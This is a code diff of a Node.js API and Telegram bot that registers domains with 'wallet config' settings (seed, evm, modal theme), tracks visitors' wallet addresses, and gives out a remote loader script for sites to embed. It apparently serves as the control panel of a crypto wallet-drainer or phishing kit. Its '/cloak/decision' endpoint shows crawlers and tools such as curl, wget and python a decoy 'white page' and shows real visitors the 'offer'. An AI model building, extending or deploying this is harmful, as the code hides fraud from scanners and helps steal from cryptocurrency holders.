@@ -18,7 +18,6 @@ if (!BOT_TOKEN) {
 // ------------------------- DATABASE -------------------------
 const db = new sqlite3.Database('./exoincs.db');
 db.serialize(() => {
-    // Table for storing domain configurations
     db.run(`CREATE TABLE IF NOT EXISTS domains (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         domain TEXT UNIQUE,
@@ -32,7 +31,6 @@ db.serialize(() => {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
 
-    // Table for tracking visitors (wallet connections)
     db.run(`CREATE TABLE IF NOT EXISTS visitors (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         domain TEXT,
@@ -48,7 +46,6 @@ db.serialize(() => {
 const app = express();
 app.use(express.json());
 
-// Endpoint: get config for a domain
 app.get('/config', (req, res) => {
     const domain = req.query.domain;
     if (!domain) return res.status(400).json({ error: 'Missing domain' });
@@ -62,7 +59,6 @@ app.get('/config', (req, res) => {
     );
 });
 
-// Endpoint: track wallet connection
 app.post('/track', (req, res) => {
     const { domain, wallet_address, action } = req.body;
     if (!domain || !wallet_address) return res.status(400).json({ error: 'Missing domain or wallet_address' });
@@ -81,41 +77,37 @@ app.post('/track', (req, res) => {
     );
 });
 
-// Optional endpoint for cloaking decision (simple bot detection)
 app.get('/cloak/decision', (req, res) => {
     const { domain, ip, ua } = req.query;
     const uaLower = (ua || '').toLowerCase();
     const isBot = /bot|crawl|spider|scrape|headless|curl|wget|python/i.test(uaLower);
     if (isBot) {
-        // You can customize white page URL per domain later
         return res.json({ page: 'white', url: 'https://example.com/white-page.html' });
     }
     return res.json({ page: 'offer' });
 });
 
-// ------------------------- TELEGRAM BOT -------------------------
+// ------------------------- TELEGRAM BOT (HTML parse_mode) -------------------------
 const bot = new Telegraf(BOT_TOKEN);
 
-// Start command
 bot.start((ctx) => {
-    ctx.reply(`🤖 *Exoincs Bot* – Manage wallet config per domain
+    ctx.reply(`🤖 <b>Exoincs Bot</b> – Manage wallet config per domain
 
 Commands:
-/register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark>
+/register &lt;domain&gt; &lt;exogator_id&gt; &lt;modaltheme&gt; &lt;towsteps&gt; &lt;evm&gt; &lt;seed&gt; &lt;auto&gt; &lt;dark&gt;
 /list
-/stats <domain>
+/stats &lt;domain&gt;
 /help
 
 Example:
-\`/register example.com EXO123 3 1 1 0 0 0\`
+<code>/register example.com EXO123 3 1 1 0 0 0</code>
 
 After registration, use this script on your website:
-\`<script src="https://assets.cdn.express/exo-loader.js?domain=example.com"></script>\`
+<code>&lt;script src="https://assets.cdn.express/exo-loader.js?domain=example.com"&gt;&lt;/script&gt;</code>
 
-The script will automatically fetch your wallet settings.`, { parse_mode: 'Markdown' });
+The script will automatically fetch your wallet settings.`, { parse_mode: 'HTML' });
 });
 
-// Register a new domain
 bot.command('register', (ctx) => {
     const args = ctx.message.text.split(' ');
     if (args.length < 9) {
@@ -137,58 +129,53 @@ bot.command('register', (ctx) => {
         `INSERT INTO domains (domain, exogator_id, modaltheme, towsteps, evm, seed, auto, dark) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
         [domain, exogator_id, modal, tow, e, s, a, d],
         (err) => {
-            if (err) return ctx.reply(`❌ Domain \`${domain}\` already registered or database error.`, { parse_mode: 'Markdown' });
+            if (err) return ctx.reply(`❌ Domain <code>${domain}</code> already registered or database error.`, { parse_mode: 'HTML' });
             const scriptUrl = `https://assets.cdn.express/exo-loader.js?domain=${encodeURIComponent(domain)}`;
-            ctx.reply(`✅ Domain \`${domain}\` registered successfully!
+            ctx.reply(`✅ Domain <b>${domain}</b> registered successfully!
 
-📜 *Script URL*:
-\`${scriptUrl}\`
+📜 <b>Script URL</b>:
+<code>${scriptUrl}</code>
 
-Add this to your website <body>:
-\`<script src="${scriptUrl}"></script>\`
+Add this to your website &lt;body&gt;:
+<code>&lt;script src="${scriptUrl}"&gt;&lt;/script&gt;</code>
 
-Your config: modaltheme=${modal}, towsteps=${tow}, evm=${e}, seed=${s}, auto=${a}, dark=${d}`, { parse_mode: 'Markdown' });
+Your config: modaltheme=${modal}, towsteps=${tow}, evm=${e}, seed=${s}, auto=${a}, dark=${d}`, { parse_mode: 'HTML' });
         }
     );
 });
 
-// List all registered domains (admin only)
 bot.command('list', (ctx) => {
     if (ADMIN_ID && ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Admin only.');
     db.all(`SELECT domain, exogator_id, created_at FROM domains ORDER BY created_at DESC`, (err, rows) => {
         if (err || !rows.length) return ctx.reply('No domains registered.');
-        let msg = '*Registered Domains:*\n';
+        let msg = '<b>Registered Domains:</b>\n';
         rows.forEach(r => {
             msg += `🌐 ${r.domain} – ${r.exogator_id} (${r.created_at})\n`;
         });
-        ctx.reply(msg, { parse_mode: 'Markdown' });
+        ctx.reply(msg, { parse_mode: 'HTML' });
     });
 });
 
-// Show visitor stats for a domain
 bot.command('stats', (ctx) => {
     const args = ctx.message.text.split(' ');
     if (args.length < 2) return ctx.reply('Usage: /stats <domain>');
     const domain = args[1];
     db.get(`SELECT COUNT(*) as total, SUM(visits) as visits FROM visitors WHERE domain = ?`, [domain], (err, row) => {
-        if (err || !row || row.total === 0) return ctx.reply(`No data for domain \`${domain}\``, { parse_mode: 'Markdown' });
-        ctx.reply(`📊 *Stats for ${domain}*\nUnique wallets: ${row.total}\nTotal visits: ${row.visits || 0}`, { parse_mode: 'Markdown' });
+        if (err || !row || row.total === 0) return ctx.reply(`No data for domain <code>${domain}</code>`, { parse_mode: 'HTML' });
+        ctx.reply(`📊 <b>Stats for ${domain}</b>\nUnique wallets: ${row.total}\nTotal visits: ${row.visits || 0}`, { parse_mode: 'HTML' });
     });
 });
 
-// Help command
 bot.command('help', (ctx) => {
     ctx.reply(`Commands:
-/register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark>
+/register &lt;domain&gt; &lt;exogator_id&gt; &lt;modaltheme&gt; &lt;towsteps&gt; &lt;evm&gt; &lt;seed&gt; &lt;auto&gt; &lt;dark&gt;
 /list – list all domains (admin)
-/stats <domain> – show visitor stats
+/stats &lt;domain&gt; – show visitor stats
 /start – show this menu
-/help – this message`);
+/help – this message`, { parse_mode: 'HTML' });
 });
 
-// Launch bot
 bot.launch();
 console.log('🤖 exoincs-bot started');
 
-// Start API server
 app.listen(PORT, () => console.log(`🌐 API server listening on port ${PORT}`));
